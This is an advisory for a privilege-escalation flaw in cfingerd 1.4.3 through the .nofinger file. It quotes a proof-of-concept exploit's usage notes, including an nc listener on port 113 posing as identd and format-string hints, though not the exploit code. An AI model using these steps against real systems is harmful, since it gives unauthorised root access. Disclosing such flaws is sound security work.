cfingerd is a secure implementation of the finger daemon. cfingerd has been contributed to by many authors, and is maintained by the cfingerd development team.

A buffer overflow in cfingerd makes it possible for a local user to gain elevated privileges. Due to insufficient validation of input, a user can execute arbitrary code through the .nofinger file.

This makes it possible for a local user to gain elevated privileges, and potentially root access.

  Cfingerd is a free and secure finger daemon replacement for
  standard finger daemons such as GNU fingerd or MIT fingerd.

   cfingerd 1.4.3 identd based localish exploit ;]
   no shellcode required if you have a local account
   make a script in ~/.nofinger that you want to be
   executed as root.

   it works by diverting the fopen call to popen. of
   course it won't help if you don't already have a
   local account but well, its just a proof of concept
   and I think it's cute, and the more exploits there
   are against an unpatched system, the more likely (I
   hope) it will get patched. Would be nice if it worked
   that way anyway.

   ./idcf|nc -l -p 113
   on a box you have root on, and finger you@otherhost
   to use.

   this is hardcoded for four letter names, but shouldn't
   require rocket science to make work for others.
   Hint:  offset and padding : format strings are fun.
